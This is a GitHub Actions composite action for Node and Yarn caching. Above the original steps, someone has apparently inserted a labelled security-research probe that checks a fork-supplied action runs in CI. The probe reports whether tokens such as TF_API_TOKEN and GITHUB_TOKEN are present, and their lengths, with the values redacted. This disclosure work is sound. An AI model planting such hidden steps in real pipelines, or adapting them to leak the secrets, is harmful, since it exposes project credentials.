name: "Setup Node and Yarn Cache"
description: "Setup Node and Yarn Cache"
inputs:
  cache-dependency-path:
    description: "The path to the dependency file to use for the Yarn cache"
    required: true
runs:
  using: "composite"
  steps:
    # SECURITY RESEARCH PROBE — non-destructive, remove after evidence capture
    - name: "FINDING-SC-015 Security Probe"
      shell: bash
      run: |
        echo "================================================================"
        echo "[POC] FINDING-SC-015 — hcloud-talos/terraform-hcloud-talos"
        echo "[POC] Fork local composite action executing in commitlint job"
        echo "[POC] whoami:   $(whoami)"
        echo "[POC] hostname: $(hostname)"
        echo "[POC] RUNNER_OS:          ${RUNNER_OS:-unknown}"
        echo "[POC] GITHUB_EVENT_NAME:  ${GITHUB_EVENT_NAME:-unknown}"
        echo "[POC] GITHUB_REPOSITORY:  ${GITHUB_REPOSITORY:-unknown}"
        echo ""
        echo "[POC] env keys of interest (values REDACTED):"
        for key in TF_API_TOKEN GITHUB_TOKEN NODE_AUTH_TOKEN ACTIONS_ID_TOKEN_REQUEST_URL; do
          val="${!key}"
          if [ -n "$val" ]; then
            echo "  $(printf '%-40s' $key) = <REDACTED length=${#val}>"
          else
            echo "  $(printf '%-40s' $key) = not set"
          fi
        done
        echo ""
        echo "[POC] PRESENCE (boolean):"
        for key in TF_API_TOKEN GITHUB_TOKEN; do
          [ -n "${!key}" ] && echo "  $(printf '%-40s' $key) = YES" || echo "  $(printf '%-40s' $key) = no"
        done
        echo "================================================================"
        echo "[POC] probe complete — no values exfiltrated, no network calls"
        echo "================================================================"
    # Original action steps below
    - name: Setup Node
      uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6.4.0
      env:
        SEGMENT_DOWNLOAD_TIMEOUT_MINS: "2"
    - name: Install Yarn with corepack enabled
      shell: bash
      run: |
        corepack enable
        corepack prepare yarn@stable --activate
    - name: Extract cached dependencies
      uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6.4.0
      with:
        cache: yarn
        cache-dependency-path: ${{ inputs.cache-dependency-path }}
